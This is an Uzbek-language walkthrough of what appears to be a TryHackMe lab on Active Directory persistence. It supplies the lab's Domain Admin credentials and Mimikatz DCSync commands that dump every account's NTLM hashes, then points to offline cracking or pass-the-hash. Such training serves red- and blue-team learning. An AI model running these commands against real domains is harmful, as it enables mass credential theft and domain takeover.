
## **Tabriklaymiz**

**Tabriklaymiz, charchagan sayohatchi!** Agar Active Directory’ni buzib, tarmoqni to‘liq o‘rganib, yuqori darajagacha ekspluatatsiya qilgan bo‘lsangiz (va bu AD tarmoqlarni ketma-ket bajargan bo‘lsangiz), nihoyat siz **"barqarorlik mehmonxonasiga"** yetib keldingiz. Endi og‘ir ishlar tugadi va biroz dam olish vaqti keldi.

AD’ga barqarorlik (persistence) o‘rnatish ham jiddiy, lekin boshqa bosqichlar kabi stressli emas. Bu yerda tasavvuringizga erkinlik berish mumkin. Shunday ekan, charchagan suyaklaringizni dam oldiring, bir piyola choy oling va boshlaymiz.

### Sizga maxfiy kirishlar taqdim etiladi:

Ushbu mashg‘ulotda, oddiy foydalanuvchi huquqlariga ega bo‘lgan akkauntga qo‘shimcha ravishda **Domain Administrator (DA)** huquqlari ham beriladi. Bu qanday omad!

Ushbu texnikalarni sinovdan o‘tkazishda siz **administrator huquqlaridan foydalanib**, oddiy foydalanuvchi ustida turli barqarorlik metodlarini amalga oshirasiz. Quyidagi Domain Admin ma'lumotlarini eslab qoling:

* **Foydalanuvchi nomi:** Administrator
* **Parol:** `tryhackmewouldnotguess1@`
* **Domen:** ZA

Biz sizga domen ustidan to‘liq nazorat berganimiz sababli, hech qanday flaglar yashirilmaydi. Ammo sizdan ushbu texnikalarni mustaqil tarzda bajarib, amaliy ko‘nikmaga ega bo‘lishingizni so‘raymiz. Bu bilimlar haqiqiy Red Team testlarida sizga juda katta foyda keltiradi, ayniqsa Blue Team (himoya jamoasi) sizni tarmoqdan chiqarib yuborishga urinayotgan vaqtda.

---

## **Barqarorlik usuli #1: Credentiallar (Foydalanuvchi ma'lumotlari)**

Oldin o‘rganilgan lateral harakatlar orqali siz credentiallarga ega bo‘lgan bo‘lishingiz mumkin. Credentiallar deganda faqat foydalanuvchi nomi va parol emas, balki **NTLM xesh** ham nazarda tutiladi, chunki uni **pass-the-hash** texnikasi orqali ishlatish mumkin.

---

## **DC Sync — Domain Controller sinxronizatsiyasi**

Katta tashkilotlarda birgina Domain Controller yetarli emas, chunki ular turli mintaqalarda joylashgan bo‘ladi. Bunday tashkilotlarda bir nechta DC (Domain Controller) bo‘lishi odatiy hol.

Bu DC’lar bir-biri bilan ma'lumot almashadi — **Domain Replication** deb ataladigan jarayon orqali. Har bir DC o‘zining **KCC (Knowledge Consistency Checker)** xizmatiga ega bo‘lib, boshqa DC’lar bilan **Remote Procedure Call (RPC)** orqali sinxronlashadi.

Bu jarayon **DC Sync** deb ataladi. DC’ni sinxronizatsiya qilish huquqi faqatgina DC’lar bilan cheklanmagan — **Domain Admin** bo‘lgan foydalanuvchilar ham bu ishni bajarishi mumkin.

---

## **DC Sync Attack (Huquqiy foydalanuvchi orqali credential yig‘ish)**

Agar sizda **Domain Replication** huquqi mavjud bo‘lsa, **Mimikatz** vositasi orqali **DC Sync hujumi** qilish mumkin va foydalanuvchilar credentiallarini yig‘ib olish mumkin.

---

## **Hamma Credentiallar teng emas**

Domain Administrator credentiallarini olish – bu ajoyib. Lekin bu credentiallar **birinchi bo‘lib parol almashtiriladigan (rotated)** credentiallar hisoblanadi. Shunday ekan, bu credentiallarga tayanish barqarorlik uchun xavfli.

Yaxshi yechim — **quyi darajadagi, ammo hali ham kuchli huquqlarga ega bo‘lgan credentiallar** orqali barqarorlikni ta'minlash:

* **Ko‘plab kompyuterlarda Local Admin bo‘lgan akkauntlar** – ular ko‘pincha barcha ishchi kompyuterlarda mavjud bo‘ladi.
* **Delegation (vakolat topshirilgan) huquqlarga ega bo‘lgan servis akkauntlar** – ulardan **Kerberos Delegation** hujumlari uchun foydalanish mumkin.
* **AD xizmatlariga aloqador bo‘lgan akkauntlar** – masalan, Exchange, WSUS, SCCM va h.k.

---

## **Barchani DC Sync qilish**

Endi esa **Mimikatz** orqali **hammadan credential yig‘amiz**:

### 1. THMWRK1 ga SSH orqali DA akkaunt bilan ulaning.

```powershell
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

### 2. Avval faqat o‘zingizni sinab ko‘ring:

```mimikatz
lsadump::dcsync /domain:za.tryhackme.loc /user:<oddiy foydalanuvchi nomi>
```

Siz NTLM xesh va boshqa ma’lumotlarni olasiz.

---

### 3. Endi esa **barcha akkauntlarni** yig‘ib olamiz:

#### Log yozishni yoqing:

```mimikatz
log <foydalanuvchi_nomi>_dcdump.txt
```

#### Keyin barchani dump qiling:

```mimikatz
lsadump::dcsync /domain:za.tryhackme.loc /all
```

Bu biroz vaqt oladi. Amal tugagach, `exit` bilan chiqing va `.txt` faylni ko‘rib chiqing.

```bash
cat <foydalanuvchi_nomi>_dcdump.txt | grep "SAM Username"
cat <foydalanuvchi_nomi>_dcdump.txt | grep "Hash NTLM"
```

Shundan so‘ng siz:

* **Offline parol sindirish** (crack)
* yoki
* **Pass-the-Hash hujumi**

bilan davom etishingiz mumkin.
